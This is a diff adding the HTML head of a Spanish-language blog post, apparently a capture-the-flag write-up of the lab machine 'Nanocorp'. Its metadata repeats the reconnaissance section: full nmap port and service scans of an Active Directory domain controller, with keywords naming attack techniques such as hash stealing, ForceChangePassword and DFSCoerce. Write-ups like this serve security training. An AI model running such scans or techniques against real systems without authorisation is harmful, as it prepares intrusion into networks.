@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Nanocorp | Borhub Blog</title>
+<meta name="keywords" content="Hard, ActiveDirectory, Hash-Stealer, AddSelf, ForceChangePassword, winPEAS, DFSCoerce, MSI-Repair">
+<meta name="description" content="
+Reconocimiento
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.182.154 -oG ports
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:33 CET
+Initiating SYN Stealth Scan at 22:33
+Scanning 10.129.182.154 [65535 ports]
+Discovered open port 80/tcp on 10.129.182.154
+Discovered open port 139/tcp on 10.129.182.154
+Discovered open port 135/tcp on 10.129.182.154
+Discovered open port 53/tcp on 10.129.182.154
+Discovered open port 445/tcp on 10.129.182.154
+Discovered open port 3389/tcp on 10.129.182.154
+Discovered open port 63955/tcp on 10.129.182.154
+Discovered open port 593/tcp on 10.129.182.154
+Discovered open port 63977/tcp on 10.129.182.154
+Discovered open port 6556/tcp on 10.129.182.154
+Discovered open port 63947/tcp on 10.129.182.154
+Discovered open port 3268/tcp on 10.129.182.154
+Discovered open port 49671/tcp on 10.129.182.154
+Discovered open port 5986/tcp on 10.129.182.154
+Discovered open port 9389/tcp on 10.129.182.154
+Discovered open port 49664/tcp on 10.129.182.154
+Discovered open port 389/tcp on 10.129.182.154
+Discovered open port 3269/tcp on 10.129.182.154
+Discovered open port 49668/tcp on 10.129.182.154
+Discovered open port 636/tcp on 10.129.182.154
+Discovered open port 88/tcp on 10.129.182.154
+Discovered open port 464/tcp on 10.129.182.154
+Completed SYN Stealth Scan at 22:33, 26.36s elapsed (65535 total ports)
+Nmap scan report for 10.129.182.154
+Host is up, received user-set (0.10s latency).
+Scanned at 2025-11-08 22:33:17 CET for 27s
+Not shown: 65513 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+5986/tcp  open  wsmans           syn-ack ttl 127
+6556/tcp  open  checkmk-agent    syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+49671/tcp open  unknown          syn-ack ttl 127
+63947/tcp open  unknown          syn-ack ttl 127
+63955/tcp open  unknown          syn-ack ttl 127
+63977/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds
+           Raw packets sent: 131061 (5.767MB) | Rcvd: 35 (1.540KB)
+ports.py ports
+
+🔍 Puertos encontrados:
+  ➜  53
+  ➜  80
+  ➜  88
+  ➜  135
+  ➜  139
+  ➜  389
+  ➜  445
+  ➜  464
+  ➜  593
+  ➜  636
+  ➜  3268
+  ➜  3269
+  ➜  3389
+  ➜  5986
+  ➜  6556
+  ➜  9389
+  ➜  49664
+  ➜  49668
+  ➜  49671
+  ➜  63947
+  ➜  63955
+  ➜  63977
+
+¡Puertos copiados en el portapapeles!
+nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5986,6556,9389,49664,49668,49671,63947,63955,63977 10.129.182.154 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:35 CET
+Nmap scan report for 10.129.182.154
+Host is up (0.20s latency).
+
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
+|_http-title: Did not follow redirect to http://nanocorp.htb/
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-09 04:34:29Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC01.nanocorp.htb
+| Not valid before: 2025-10-20T01:58:09
+|_Not valid after:  2026-04-21T01:58:09
+|_ssl-date: 2025-11-09T04:36:06&#43;00:00; &#43;6h59m04s from scanner time.
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=dc01.nanocorp.htb
+| Subject Alternative Name: DNS:dc01.nanocorp.htb
+| Not valid before: 2025-04-06T22:58:43
+|_Not valid after:  2026-04-06T23:18:43
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn:
+|_  http/1.1
+|_http-title: Not Found
+6556/tcp  open  check_mk          check_mk extension for Nagios 2.1.0p10
+9389/tcp  open  mc-nmf            .NET Message Framing
+49664/tcp open  msrpc             Microsoft Windows RPC
+49668/tcp open  msrpc             Microsoft Windows RPC
+49671/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+63947/tcp open  msrpc             Microsoft Windows RPC
+63955/tcp open  msrpc             Microsoft Windows RPC
+63977/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m04s, deviation: 0s, median: 6h59m03s
+| smb2-time:
+|   date: 2025-11-09T04:35:28
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 107.71 seconds
+Enumeración web
+En el escaneo con nmap vemos que tenemos el puerto web expuesto, entonces lo primero que hacemos es tratar de enumerarlo para buscar posibles vectores de ataque.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/nanocorp/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.27492627d52d32d617e2faf58e652b2e2633796e5697eb3efd37682f981ae0f1.css" integrity="sha256-J0kmJ9UtMtYX4vr1jmUrLiYzeW5Wl&#43;s&#43;/TdoL5ga4PE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/nanocorp/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/nanocorp/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Nanocorp">
+  <meta property="og:description" content="
+Reconocimiento nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.182.154 -oG ports Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:33 CET Initiating SYN Stealth Scan at 22:33 Scanning 10.129.182.154 [65535 ports] Discovered open port 80/tcp on 10.129.182.154 Discovered open port 139/tcp on 10.129.182.154 Discovered open port 135/tcp on 10.129.182.154 Discovered open port 53/tcp on 10.129.182.154 Discovered open port 445/tcp on 10.129.182.154 Discovered open port 3389/tcp on 10.129.182.154 Discovered open port 63955/tcp on 10.129.182.154 Discovered open port 593/tcp on 10.129.182.154 Discovered open port 63977/tcp on 10.129.182.154 Discovered open port 6556/tcp on 10.129.182.154 Discovered open port 63947/tcp on 10.129.182.154 Discovered open port 3268/tcp on 10.129.182.154 Discovered open port 49671/tcp on 10.129.182.154 Discovered open port 5986/tcp on 10.129.182.154 Discovered open port 9389/tcp on 10.129.182.154 Discovered open port 49664/tcp on 10.129.182.154 Discovered open port 389/tcp on 10.129.182.154 Discovered open port 3269/tcp on 10.129.182.154 Discovered open port 49668/tcp on 10.129.182.154 Discovered open port 636/tcp on 10.129.182.154 Discovered open port 88/tcp on 10.129.182.154 Discovered open port 464/tcp on 10.129.182.154 Completed SYN Stealth Scan at 22:33, 26.36s elapsed (65535 total ports) Nmap scan report for 10.129.182.154 Host is up, received user-set (0.10s latency). Scanned at 2025-11-08 22:33:17 CET for 27s Not shown: 65513 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5986/tcp open wsmans syn-ack ttl 127 6556/tcp open checkmk-agent syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 49671/tcp open unknown syn-ack ttl 127 63947/tcp open unknown syn-ack ttl 127 63955/tcp open unknown syn-ack ttl 127 63977/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds Raw packets sent: 131061 (5.767MB) | Rcvd: 35 (1.540KB) ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 80 ➜ 88 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 3268 ➜ 3269 ➜ 3389 ➜ 5986 ➜ 6556 ➜ 9389 ➜ 49664 ➜ 49668 ➜ 49671 ➜ 63947 ➜ 63955 ➜ 63977 ¡Puertos copiados en el portapapeles! nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5986,6556,9389,49664,49668,49671,63947,63955,63977 10.129.182.154 -oN targeted Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:35 CET Nmap scan report for 10.129.182.154 Host is up (0.20s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12) |_http-title: Did not follow redirect to http://nanocorp.htb/ |_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-11-09 04:34:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC01.nanocorp.htb | Not valid before: 2025-10-20T01:58:09 |_Not valid after: 2026-04-21T01:58:09 |_ssl-date: 2025-11-09T04:36:06&#43;00:00; &#43;6h59m04s from scanner time. 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=dc01.nanocorp.htb | Subject Alternative Name: DNS:dc01.nanocorp.htb | Not valid before: 2025-04-06T22:58:43 |_Not valid after: 2026-04-06T23:18:43 |_ssl-date: TLS randomness does not represent time |_http-server-header: Microsoft-HTTPAPI/2.0 | tls-alpn: |_ http/1.1 |_http-title: Not Found 6556/tcp open check_mk check_mk extension for Nagios 2.1.0p10 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 63947/tcp open msrpc Microsoft Windows RPC 63955/tcp open msrpc Microsoft Windows RPC 63977/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required |_clock-skew: mean: 6h59m04s, deviation: 0s, median: 6h59m03s | smb2-time: | date: 2025-11-09T04:35:28 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 107.71 seconds Enumeración web En el escaneo con nmap vemos que tenemos el puerto web expuesto, entonces lo primero que hacemos es tratar de enumerarlo para buscar posibles vectores de ataque.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="Hash-Stealer">
+    <meta property="article:tag" content="AddSelf">
+    <meta property="article:tag" content="ForceChangePassword">
+    <meta property="article:tag" content="WinPEAS">
+    <meta property="og:image" content="https://borhuub.github.io/logo_machines/nanocorp.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/logo_machines/nanocorp.png">
+<meta name="twitter:title" content="Nanocorp">
+<meta name="twitter:description" content="
+Reconocimiento
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.182.154 -oG ports
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:33 CET
+Initiating SYN Stealth Scan at 22:33
+Scanning 10.129.182.154 [65535 ports]
+Discovered open port 80/tcp on 10.129.182.154
+Discovered open port 139/tcp on 10.129.182.154
+Discovered open port 135/tcp on 10.129.182.154
+Discovered open port 53/tcp on 10.129.182.154
+Discovered open port 445/tcp on 10.129.182.154
+Discovered open port 3389/tcp on 10.129.182.154
+Discovered open port 63955/tcp on 10.129.182.154
+Discovered open port 593/tcp on 10.129.182.154
+Discovered open port 63977/tcp on 10.129.182.154
+Discovered open port 6556/tcp on 10.129.182.154
+Discovered open port 63947/tcp on 10.129.182.154
+Discovered open port 3268/tcp on 10.129.182.154
+Discovered open port 49671/tcp on 10.129.182.154
+Discovered open port 5986/tcp on 10.129.182.154
+Discovered open port 9389/tcp on 10.129.182.154
+Discovered open port 49664/tcp on 10.129.182.154
+Discovered open port 389/tcp on 10.129.182.154
+Discovered open port 3269/tcp on 10.129.182.154
+Discovered open port 49668/tcp on 10.129.182.154
+Discovered open port 636/tcp on 10.129.182.154
+Discovered open port 88/tcp on 10.129.182.154
+Discovered open port 464/tcp on 10.129.182.154
+Completed SYN Stealth Scan at 22:33, 26.36s elapsed (65535 total ports)
+Nmap scan report for 10.129.182.154
+Host is up, received user-set (0.10s latency).
+Scanned at 2025-11-08 22:33:17 CET for 27s
+Not shown: 65513 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+5986/tcp  open  wsmans           syn-ack ttl 127
+6556/tcp  open  checkmk-agent    syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+49671/tcp open  unknown          syn-ack ttl 127
+63947/tcp open  unknown          syn-ack ttl 127
+63955/tcp open  unknown          syn-ack ttl 127
+63977/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds
+           Raw packets sent: 131061 (5.767MB) | Rcvd: 35 (1.540KB)
+ports.py ports
+
+🔍 Puertos encontrados:
+  ➜  53
+  ➜  80
+  ➜  88
+  ➜  135
+  ➜  139
+  ➜  389
+  ➜  445
+  ➜  464
+  ➜  593
+  ➜  636
+  ➜  3268
+  ➜  3269
+  ➜  3389
+  ➜  5986
+  ➜  6556
+  ➜  9389
+  ➜  49664
+  ➜  49668
+  ➜  49671
+  ➜  63947
+  ➜  63955
+  ➜  63977
+
+¡Puertos copiados en el portapapeles!
+nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5986,6556,9389,49664,49668,49671,63947,63955,63977 10.129.182.154 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:35 CET
+Nmap scan report for 10.129.182.154
+Host is up (0.20s latency).
+
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
+|_http-title: Did not follow redirect to http://nanocorp.htb/
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-11-09 04:34:29Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC01.nanocorp.htb
+| Not valid before: 2025-10-20T01:58:09
+|_Not valid after:  2026-04-21T01:58:09
+|_ssl-date: 2025-11-09T04:36:06&#43;00:00; &#43;6h59m04s from scanner time.
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=dc01.nanocorp.htb
+| Subject Alternative Name: DNS:dc01.nanocorp.htb
+| Not valid before: 2025-04-06T22:58:43
+|_Not valid after:  2026-04-06T23:18:43
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn:
+|_  http/1.1
+|_http-title: Not Found
+6556/tcp  open  check_mk          check_mk extension for Nagios 2.1.0p10
+9389/tcp  open  mc-nmf            .NET Message Framing
+49664/tcp open  msrpc             Microsoft Windows RPC
+49668/tcp open  msrpc             Microsoft Windows RPC
+49671/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+63947/tcp open  msrpc             Microsoft Windows RPC
+63955/tcp open  msrpc             Microsoft Windows RPC
+63977/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+|_clock-skew: mean: 6h59m04s, deviation: 0s, median: 6h59m03s
+| smb2-time:
+|   date: 2025-11-09T04:35:28
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 107.71 seconds
+Enumeración web
+En el escaneo con nmap vemos que tenemos el puerto web expuesto, entonces lo primero que hacemos es tratar de enumerarlo para buscar posibles vectores de ataque.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Nanocorp",
+      "item": "https://borhuub.github.io/writeups/nanocorp/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Nanocorp",
+  "name": "Nanocorp",
+  "description": "\nReconocimiento nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.182.154 -oG ports Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:33 CET Initiating SYN Stealth Scan at 22:33 Scanning 10.129.182.154 [65535 ports] Discovered open port 80/tcp on 10.129.182.154 Discovered open port 139/tcp on 10.129.182.154 Discovered open port 135/tcp on 10.129.182.154 Discovered open port 53/tcp on 10.129.182.154 Discovered open port 445/tcp on 10.129.182.154 Discovered open port 3389/tcp on 10.129.182.154 Discovered open port 63955/tcp on 10.129.182.154 Discovered open port 593/tcp on 10.129.182.154 Discovered open port 63977/tcp on 10.129.182.154 Discovered open port 6556/tcp on 10.129.182.154 Discovered open port 63947/tcp on 10.129.182.154 Discovered open port 3268/tcp on 10.129.182.154 Discovered open port 49671/tcp on 10.129.182.154 Discovered open port 5986/tcp on 10.129.182.154 Discovered open port 9389/tcp on 10.129.182.154 Discovered open port 49664/tcp on 10.129.182.154 Discovered open port 389/tcp on 10.129.182.154 Discovered open port 3269/tcp on 10.129.182.154 Discovered open port 49668/tcp on 10.129.182.154 Discovered open port 636/tcp on 10.129.182.154 Discovered open port 88/tcp on 10.129.182.154 Discovered open port 464/tcp on 10.129.182.154 Completed SYN Stealth Scan at 22:33, 26.36s elapsed (65535 total ports) Nmap scan report for 10.129.182.154 Host is up, received user-set (0.10s latency). Scanned at 2025-11-08 22:33:17 CET for 27s Not shown: 65513 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 80/tcp open http syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 5986/tcp open wsmans syn-ack ttl 127 6556/tcp open checkmk-agent syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 49671/tcp open unknown syn-ack ttl 127 63947/tcp open unknown syn-ack ttl 127 63955/tcp open unknown syn-ack ttl 127 63977/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds Raw packets sent: 131061 (5.767MB) | Rcvd: 35 (1.540KB) ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 80 ➜ 88 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 3268 ➜ 3269 ➜ 3389 ➜ 5986 ➜ 6556 ➜ 9389 ➜ 49664 ➜ 49668 ➜ 49671 ➜ 63947 ➜ 63955 ➜ 63977 ¡Puertos copiados en el portapapeles! nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5986,6556,9389,49664,49668,49671,63947,63955,63977 10.129.182.154 -oN targeted Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-08 22:35 CET Nmap scan report for 10.129.182.154 Host is up (0.20s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12) |_http-title: Did not follow redirect to http://nanocorp.htb/ |_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-11-09 04:34:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC01.nanocorp.htb | Not valid before: 2025-10-20T01:58:09 |_Not valid after: 2026-04-21T01:58:09 |_ssl-date: 2025-11-09T04:36:06+00:00; +6h59m04s from scanner time. 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=dc01.nanocorp.htb | Subject Alternative Name: DNS:dc01.nanocorp.htb | Not valid before: 2025-04-06T22:58:43 |_Not valid after: 2026-04-06T23:18:43 |_ssl-date: TLS randomness does not represent time |_http-server-header: Microsoft-HTTPAPI/2.0 | tls-alpn: |_ http/1.1 |_http-title: Not Found 6556/tcp open check_mk check_mk extension for Nagios 2.1.0p10 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 63947/tcp open msrpc Microsoft Windows RPC 63955/tcp open msrpc Microsoft Windows RPC 63977/tcp open msrpc Microsoft Windows RPC Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required |_clock-skew: mean: 6h59m04s, deviation: 0s, median: 6h59m03s | smb2-time: | date: 2025-11-09T04:35:28 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 107.71 seconds Enumeración web En el escaneo con nmap vemos que tenemos el puerto web expuesto, entonces lo primero que hacemos es tratar de enumerarlo para buscar posibles vectores de ataque.\n",
+  "keywords": [
